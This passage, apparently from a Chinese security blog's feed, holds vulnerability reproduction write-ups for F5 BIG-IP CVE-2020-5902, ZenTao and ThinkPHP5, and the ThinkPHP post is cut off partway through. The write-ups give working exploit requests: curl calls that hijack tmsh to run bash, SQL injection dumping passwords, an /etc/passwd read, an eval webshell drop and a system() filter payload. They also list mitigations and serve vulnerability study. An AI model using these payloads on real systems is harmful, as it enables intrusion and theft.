class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">wget -P /usr/share/metasploit-framework/modules/exploits/linux/http/ https://raw.githubusercontent.com/rapid7/metasploit-framework/0417e88ff24bf05b8874c953bd91600f10186ba4/modules/exploits/linux/http/f5_bigip_tmui_rce.rb</span><br><span class="line">reload_all</span><br><span class="line">exploit/linux/http/f5_bigip_tmui_rce 2020-06-30 excellent Yes F5 BIG-IP TMUI Directory Traversal and File Upload RCE</span><br><span class="line">╭─root@kali ~ </span><br><span class="line">╰─<span class="comment"># msfconsole </span></span><br><span class="line">                                                  </span><br><span class="line">     ,           ,</span><br><span class="line">    /             \</span><br><span class="line">   ((__---,,,---__))</span><br><span class="line">      (_) O O (_)_________</span><br><span class="line">         \ _ /            |\</span><br><span class="line">          o_o \   M S F   | \</span><br><span class="line">               \   _____  |  *</span><br><span class="line">                |||   WW|||</span><br><span class="line">                |||     |||</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.87-dev                          ]</span><br><span class="line">+ -- --=[ 2007 exploits - 1096 auxiliary - 343 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: After running db_nmap, be sure to check out the result of hosts and services</span><br><span class="line"></span><br><span class="line">msf5 &gt; reload_all </span><br><span class="line">[*] Reloading modules from all module paths...</span><br><span class="line">               .;lxO0KXXXK0Oxl:.</span><br><span class="line">           ,o0WMMMMMMMMMMMMMMMMMMKd,</span><br><span class="line">        <span class="string">'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,</span></span><br><span class="line"><span class="string">      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:</span></span><br><span class="line"><span class="string">    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,</span></span><br><span class="line"><span class="string">   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo</span></span><br><span class="line"><span class="string">  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk</span></span><br><span class="line"><span class="string"> oMMMMMMMMMMx.                    dMMMMMMMMMMx</span></span><br><span class="line"><span class="string">.WMMMMMMMMM:                       :MMMMMMMMMM,</span></span><br><span class="line"><span class="string">xMMMMMMMMMo                         lMMMMMMMMMO</span></span><br><span class="line"><span class="string">NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;</span></span><br><span class="line"><span class="string">MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:</span></span><br><span class="line"><span class="string">NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:</span></span><br><span class="line"><span class="string">xMMMMMMMMMd                        ,0MMMMMMMMMMK;</span></span><br><span class="line"><span class="string">.WMMMMMMMMMc                         '</span>OMMMMMM0,</span><br><span class="line"> lMMMMMMMMMMk.                         .kMMO<span class="string">'</span></span><br><span class="line"><span class="string">  dMMMMMMMMMMWd'</span>                         ..</span><br><span class="line">   cWMMMMMMMMMMMNxc<span class="string">'.                ##########</span></span><br><span class="line"><span class="string">    .0MMMMMMMMMMMMMMMMWc            #+#    #+#</span></span><br><span class="line"><span class="string">      ;0MMMMMMMMMMMMMMMo.          +:+</span></span><br><span class="line"><span class="string">        .dNMMMMMMMMMMMMo          +#++:++#+</span></span><br><span class="line"><span class="string">           '</span>oOWMMMMMMMMo                +:+</span><br><span class="line">               .,cdkO0K;        :+:    :+:                                </span><br><span class="line">                                :::::::+:</span><br><span class="line">                      Metasploit</span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.87-dev                          ]</span><br><span class="line">+ -- --=[ 2007 exploits - 1096 auxiliary - 343 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: Save the current environment with the save <span class="built_in">command</span>, future console restarts will use this environment again</span><br><span class="line"></span><br><span class="line">msf5 &gt; search f5_bigip</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                            Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -  ----                                            ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary/dos/http/f5_bigip_apm_max_sessions                     normal     No     F5 BigIP Access Policy Manager Session Exhaustion Denial of Service</span><br><span class="line">   1  auxiliary/gather/f5_bigip_cookie_disclosure                      normal     No     F5 BigIP Backend Cookie Disclosure</span><br><span class="line">   2  auxiliary/scanner/http/f5_bigip_virtual_server                   normal     No     F5 BigIP HTTP Virtual Server Scanner</span><br><span class="line">   3  exploit/linux/ssh/f5_bigip_known_privkey        2012-06-11       excellent  No     F5 BIG-IP SSH Private Key Exposure</span><br><span class="line">   4  exploit/linux/http/f5_bigip_tmui_rce            2020-06-30       excellent  Yes    F5 BIG-IP TMUI Directory Traversal and File Upload RCE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt;</span><br></pre></td></tr></table></figure><h3 id="执行tmsh命令"><a href="#执行tmsh命令" class="headerlink" title="执行tmsh命令"></a>执行tmsh命令</h3><p> <strong>tmshCmd.jsp + fileSave.jsp = Linux RCE</strong></p><p>`</p><ol><li><p>tmshCmd.jsp?command=create+cli+alias+private+list+command+bash</p></li><li><p>fileSave.jsp?fileName=/tmp/cmd&amp;content=id</p></li><li><p>tmshCmd.jsp?command=list+/tmp/cmd</p></li><li><p>tmshCmd.jsp?command=delete+cli+alias+private+list<br>`</p></li><li><p>修改alias劫持list命令为bash</p><p> <code>curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash&quot;</code></p></li><li><p>写入bash文件</p><p> <code>curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/test&amp;content=id&quot;</code></p></li><li><p>执行bash文件</p><p> <code>curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/test&quot;</code></p></li><li><p>还原list命令</p><p> <code>curl -k &quot;https://example.com/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list&quot;</code></p></li></ol><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><h3 id="通用修补建议："><a href="#通用修补建议：" class="headerlink" title="通用修补建议："></a>通用修补建议：</h3><p>升级到以下版本</p><ul><li>BIG-IP 15.x: 15.1.0.4</li><li>BIG-IP 14.x: 14.1.2.6</li><li>BIG-IP 13.x: 13.1.3.4</li><li>BIG-IP 12.x: 12.1.5.2</li><li>BIG-IP 11.x: 11.6.5.2</li></ul><h3 id="临时修补建议："><a href="#临时修补建议：" class="headerlink" title="临时修补建议："></a>临时修补建议：</h3><p>官方建议可以通过以下步骤临时缓解影响</p><p>1) 使用以下命令登录对应系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmsh</span><br></pre></td></tr></table></figure><p>2) 编辑 <code>httpd</code> 组件的配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit &#x2F;sys httpd all-properties</span><br></pre></td></tr></table></figure><p>3) 文件内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include &#39;</span><br><span class="line">&lt;LocationMatch &quot;.*\.\.;.*&quot;&gt;</span><br><span class="line">Redirect 404 &#x2F;</span><br><span class="line">&lt;&#x2F;LocationMatch&gt;</span><br><span class="line">&#39;</span><br></pre></td></tr></table></figure><p>4) 按照如下操作保存文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">按下 ESC 并依次输入</span><br><span class="line">:wq</span><br></pre></td></tr></table></figure><p>5) 执行命令刷新配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">save &#x2F;sys config</span><br></pre></td></tr></table></figure><p>6) 重启 httpd 服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">restart sys service httpd</span><br></pre></td></tr></table></figure><p>建议同时禁止外部IP对于TMUI的访问，或只允许管理人员在安全网络环境下访问来缓解漏洞</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/jas502n/CVE-2020-5902" target="_blank" rel="noopener">CVE-2020-5902 BIG-IP</a></p><p><a href="https://cert.360.cn/warning/detail?id=a1768348bde7807647cbc7232edce7df" target="_blank" rel="noopener">【利用公开】CVE-2020-5902: F5 BIG-IP 远程代码执行漏洞通告</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CVE-2020-5902：F5-BIG-IP-远程代码执行漏洞复现&quot;&gt;&lt;a href=&quot;#CVE-2020-5902：F5-BIG-IP-远程代码执行漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;CVE-2020-5902：F5 BIG-IP 远程代码执行漏洞复现&quot;&gt;&lt;/a&gt;CVE-2020-5902：F5 BIG-IP 远程代码执行漏洞复现&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;F5 BIG-IP 是美国F5公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。&lt;/p&gt;
&lt;h2 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h2&gt;&lt;p&gt;2020年7月1日，F5官方公布流量管理用户界面（TMUI）存在 前台远程执行代码（RCE）漏洞（CVE-2020-5902）。攻击者利用该漏洞，构造恶意请求，在未授权的情况下获得目标服务器的权限，实现远程代码执行。&lt;/p&gt;
&lt;p&gt;未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行。进而控制 F5 BIG-IP的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。该漏洞影响控制面板受影响，不影响数据面板。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="BIG-IP" scheme="http://yoursite.com/tags/BIG-IP/"/>
    
      <category term="F5" scheme="http://yoursite.com/tags/F5/"/>
    
  </entry>
  
  <entry>
    <title>禅道全版本rce漏洞复现笔记</title>
    <link href="http://yoursite.com/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-07-11T10:54:56.000Z</published>
    <updated>2020-07-11T12:03:54.585Z</updated>
    
    <content type="html"><![CDATA[<h1 id="禅道全版本rce漏洞复现笔记"><a href="#禅道全版本rce漏洞复现笔记" class="headerlink" title="禅道全版本rce漏洞复现笔记"></a>禅道全版本rce漏洞复现笔记</h1><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p><a href="https://www.zentao.net/" target="_blank" rel="noopener">禅道项目管理软件</a>是一款国产的，基于LGPL协议，开源免费的项目管理软件，它集产品管理、项目管理、测试管理于一体，同时还包含了事务管理、组织管理等诸多功能，是中小型企业项目管理的首选，基于自主的PHP开发框架──ZenTaoPHP而成，第三方开发者或企业可非常方便的开发插件或者进行定制。<br>此次发现的漏洞正是ZenTaoPHP框架中的通用代码所造成的的，因此禅道几乎所有的项目都受此漏洞影响。本次漏洞复现以ZenTaoPMS.11.6版本作为演示</p><a id="more"></a><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载链接：<a href="https://www.zentao.net/download/80153.html" target="_blank" rel="noopener">https://www.zentao.net/download/80153.html</a></p><p>解压安装后访问禅道主页 <a href="http://127.0.0.1/index.php" target="_blank" rel="noopener">http://127.0.0.1/index.php</a></p><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/1.png" alt></p><p>查看当前版本 <a href="http://127.0.0.1:81/zentao/index.php?mode=getconfig" target="_blank" rel="noopener">http://127.0.0.1:81/zentao/index.php?mode=getconfig</a></p><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/2.png" alt></p><p>至此环境搭建成功</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞1-SQL注入"><a href="#漏洞1-SQL注入" class="headerlink" title="漏洞1 SQL注入"></a>漏洞1 SQL注入</h3><p>首先我们登录admin/CD87691043cs账户修改默认密码，创建一个普通Test0001/1qaz2wsx3edc!@#$用户并登录</p><blockquote><p> Payload </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;zentao&#x2F;api-getModel-api-sql-sql&#x3D;select+account,password+from+zt_user</span><br></pre></td></tr></table></figure><p>Poc访问结果如下：</p><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/3.png" alt></p><h3 id="漏洞2-文件读取"><a href="#漏洞2-文件读取" class="headerlink" title="漏洞2 文件读取"></a>漏洞2 文件读取</h3><blockquote><p>Payload </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;zentao&#x2F;api-getModel-file-parseCSV-fileName&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>Poc访问结果如下：</p><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/4.png" alt></p><p>由于本地环境是window系统，所以没有回显，我们在xampp\zentao\module\api目录下新建一个test文件，读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;zentao&#x2F;api-getModel-file-parseCSV-fileName&#x3D;test</span><br></pre></td></tr></table></figure><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/5.png" alt></p><h3 id="漏洞3-RCE"><a href="#漏洞3-RCE" class="headerlink" title="漏洞3 RCE"></a>漏洞3 RCE</h3><p>利用上面的文件读取来执行命令</p><blockquote><p>Payload1</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/zentao/api-getModel-editor-save-filePath=1111</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: lang=zh-cn; device=desktop; theme=default; windowWidth=2426; windowHeight=796; zentaosid=vqruohhgn7qbhveakg04h9e267</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 29</span><br><span class="line"></span><br><span class="line">fileContent=&lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/6.png" alt></p><p>先写入一个phpinfo，再读取访问</p><p>需要给物理路径加上一层才能包含成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;zentao&#x2F;api-getModel-api-getMethod-filePath&#x3D;1111&#x2F;1</span><br></pre></td></tr></table></figure><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/7.png" alt></p><blockquote><p>Payload2</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fileContent&#x3D;&lt;?php system(&#39;whoami&#39;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/8.png" alt></p><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/9.png" alt></p><blockquote><p>Payload3(一句话)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fileContent&#x3D;&lt;?php file_put_contents(&#39;E:&#x2F;&#x2F;CMS&#x2F;ZenTaoPMS&#x2F;xampp&#x2F;zentao&#x2F;www&#x2F;xxx.php.aaa&#39;, &#39;&lt;?php @eval($_REQUEST[&quot;x&quot;]);?&gt;&#39;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/10.png" alt></p><p>这里是window系统，所以写入绝对路径，绝对路径可以同样用<code>fileContent=&lt;?php getcwd()?&gt;</code>获取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;zentao&#x2F;xxx.php.aaa?x&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/11.png" alt></p><p><em>PS:最好使用linux系统安装，windows不要使用一键安装包安装，windows系统安装集成版的话根目录下的php代码好像做了限制，无法执行。</em></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jianshu.com/p/62bb128ecbdb" target="_blank" rel="noopener">【渗透笔记】禅道</a></p><p><a href="http://foreversong.cn/archives/1410" target="_blank" rel="noopener">禅道全版本rce漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;禅道全版本rce漏洞复现笔记&quot;&gt;&lt;a href=&quot;#禅道全版本rce漏洞复现笔记&quot; class=&quot;headerlink&quot; title=&quot;禅道全版本rce漏洞复现笔记&quot;&gt;&lt;/a&gt;禅道全版本rce漏洞复现笔记&lt;/h1&gt;&lt;h2 id=&quot;漏洞说明&quot;&gt;&lt;a href=&quot;#漏洞说明&quot; class=&quot;headerlink&quot; title=&quot;漏洞说明&quot;&gt;&lt;/a&gt;漏洞说明&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zentao.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;禅道项目管理软件&lt;/a&gt;是一款国产的，基于LGPL协议，开源免费的项目管理软件，它集产品管理、项目管理、测试管理于一体，同时还包含了事务管理、组织管理等诸多功能，是中小型企业项目管理的首选，基于自主的PHP开发框架──ZenTaoPHP而成，第三方开发者或企业可非常方便的开发插件或者进行定制。&lt;br&gt;此次发现的漏洞正是ZenTaoPHP框架中的通用代码所造成的的，因此禅道几乎所有的项目都受此漏洞影响。本次漏洞复现以ZenTaoPMS.11.6版本作为演示&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="禅道" scheme="http://yoursite.com/tags/%E7%A6%85%E9%81%93/"/>
    
      <category term="zentao" scheme="http://yoursite.com/tags/zentao/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5 核心类 Request 远程代码漏洞分析</title>
    <link href="http://yoursite.com/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-07-11T10:47:35.000Z</published>
    <updated>2020-07-11T12:06:26.767Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP5-核心类-Request-远程代码漏洞复现-Poc"><a href="#ThinkPHP5-核心类-Request-远程代码漏洞复现-Poc" class="headerlink" title="ThinkPHP5 核心类 Request 远程代码漏洞复现+Poc"></a>ThinkPHP5 核心类 Request 远程代码漏洞复现+Poc</h1><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>2019年1月11日，ThinkPHP团队发布了一个<a href="https://blog.thinkphp.cn/910675" target="_blank" rel="noopener">补丁更新</a>，修复了一处由于不安全的动态函数调用导致的远程代码执行漏洞。</p><p>ThinkPHP官方发布新版本5.0.24，在1月14日和15日又接连发布两个更新，这三次更新都修复了一个安全问题，该问题可能导致远程代码执行 ，这是ThinkPHP近期的第二个高危漏洞，两个漏洞均是无需登录即可远程触发，危害极大。</p><p>之前写过一篇文章《<a href="https://chaceshadow.github.io/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/#method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce" target="_blank" rel="noopener">ThinkPHP-5-代码执行漏洞复现-POC</a>》里面有提过一次，这篇文章主要对其不同版本下进行详细的复现。</p><a id="more"></a><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>启明星辰ADLab安全研究员对ThinkPHP的多个版本进行源码分析和验证后，确认具体受影响的版本为ThinkPHP5.0-5.0.23完整版。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>本地环境采用ThinkPHP 5.0.10和5.0.22完整版+PHP7.0.9+Apache2.4.39进行复现。安装环境后执行POC即可执行系统命令</p><h2 id="版本-5-0-0-5-0-12"><a href="#版本-5-0-0-5-0-12" class="headerlink" title="版本 5.0.0-5.0.12"></a>版本 5.0.0-5.0.12</h2><blockquote><p>Payload：</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/public/index.php?s=index/index/index</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.236</span><br><span class="line"><span class="attribute">Content-Length</span>: 48</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">s=whoami&amp;_method=__construct&amp;filter[]=system</span><br></pre></td></tr></table></figure><p>POC执行结果如下图：<br>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1.png" alt></p><p>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2.png" alt></p><h2 id="版本-5-0-12-5-0-23"><a href="#版本-5-0-12-5-0-23" class="headerlink" title="版本 5.0.12-5.0.23"></a>版本 5.0.12-5.0.23</h2><p>在5.0.12之后的版本中，在<code>thinkphp/library/think/App.php的module</code>方法中增加了设置filter过滤属性的代码</p><p>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3.png" alt></p><p>开启debug调试模式，打开配置文件<code>config.php</code></p><p>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4.png" alt></p><p>修改为</p><p>   <img src="/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png" alt></p><blockquote><p>Payload 1</p></blockquote>  <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 